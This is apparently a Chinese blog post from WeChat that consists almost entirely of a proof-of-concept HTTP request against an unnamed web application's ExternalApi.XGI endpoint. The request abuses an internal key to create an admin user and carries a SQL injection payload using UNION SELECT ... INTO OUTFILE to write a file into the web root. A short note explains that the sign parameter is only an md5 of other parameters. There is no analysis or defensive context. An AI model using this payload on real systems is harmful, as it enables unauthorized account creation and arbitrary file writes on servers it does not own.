<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WASMrpt-2Txd2jnM15KPeQ)

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwMfqGa1JyFFzXOjVHOLqa9DMwsPicC2mVMHd15gaYfTKonVBMIcHe8Xkmpmia67uCH5mTCjEkryc1Hw/640?wx_fmt=png)

过程代码懒得贴了  

没有记录分析过程，笔记只有 poc 了，直接贴吧。

```
POST /ExternalApi.XGI?key=inner&initParams=command_createUser__user_admin__pwd_password&sign=90286714fbfb1b4396d38e0358216dd1 HTTP/1.1
Host: 192.168.0.117
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Cookie:PHPSESSID=s6f7a5s1rui8e64o163b484au1;
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/octet-stream
Content-Length: 246
{"account":"aaaa' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 into outfile '..\\\\..\\\\WebRoot\\\\11.txt'#","userPwd":"bbbb","userGroupId":"1"}

```

其中 sign 签名为 initParams+key 参数的 md5, 所以不用管。  

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwOTI9R0HP1ahk5P93K3VZkSr4J0fG743YxiaC4ktBTw4d8yjLjIfPibkzmP7YX0gofU3YhAia7IM86xA/640?wx_fmt=png)